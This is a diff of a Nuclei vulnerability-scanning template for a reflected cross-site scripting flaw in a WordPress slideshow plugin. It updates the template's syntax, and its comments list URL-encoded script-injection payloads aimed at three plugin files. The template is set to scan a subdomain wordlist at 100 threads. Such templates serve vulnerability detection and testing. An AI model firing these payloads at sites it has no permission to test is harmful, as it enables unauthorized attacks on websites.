@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-slideshow-xss
 info:
   name: WordPress Plugin Slideshow - Reflected Cross-Site Scripting (XSS)
@@ -8,10 +9,10 @@ info:
 #wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?slides[0][type]=text&slides[0][title]=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E'
 #wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/settings.php?settings[][group]=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E'
 #wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPluginPostType/style-settings.php?settings[0]&inputFields[0]=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E'
-requests:
+http:
   - payloads:
       Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
+
     threads: 100
     raw:
       - |
